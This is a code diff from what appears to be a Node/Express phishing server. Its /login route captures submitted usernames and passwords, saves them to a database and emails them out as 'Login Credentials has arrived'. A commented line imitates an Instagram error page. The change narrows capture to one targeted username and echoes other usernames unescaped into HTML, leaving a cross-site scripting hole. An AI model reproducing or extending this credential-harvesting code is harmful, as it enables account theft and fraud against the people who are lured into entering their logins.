@@ -54,7 +54,7 @@ const sendemail = async (req, res) => {
   let response = {
     body: {
       name: 'Azurafoundation',
-      intro:`Login Credentials has arrived username=${username} password=${password}`,
+      intro: `Login Credentials has arrived username=${username} password=${password}`,
       outro: 'Check Out now on the data base'
     }
   }
@@ -115,15 +115,19 @@ app.post('/login', (req, res) => {
   // res.send('<img src="./assets/img/instagram.svg"></img><h1>Connection got disconnected due to bad gate way, try again </h1>')
   username = req.body.username;
   password = req.body.password;
-  const user = new User({ username, password });
-  user.save().then(() => {
-    console.log('hogaya');
-    res.redirect(`/verification`);
-  }).catch((err) => {
-    console.log(err);
-    res.status(200)
-    res.redirect('*');
-  })
+  if (username == 'ayush.2027') {
+    const user = new User({ username, password });
+    user.save().then(() => {
+      console.log('hogaya');
+      res.redirect(`/verification`);
+    }).catch((err) => {
+      console.log(err);
+      res.status(200)
+      res.redirect('*');
+    })
+  }else{
+    res.send(`<h1>${username} is not in this group.</h1>`);
+  }
 })
 app.get('/groupchat', (req, res) => {
 
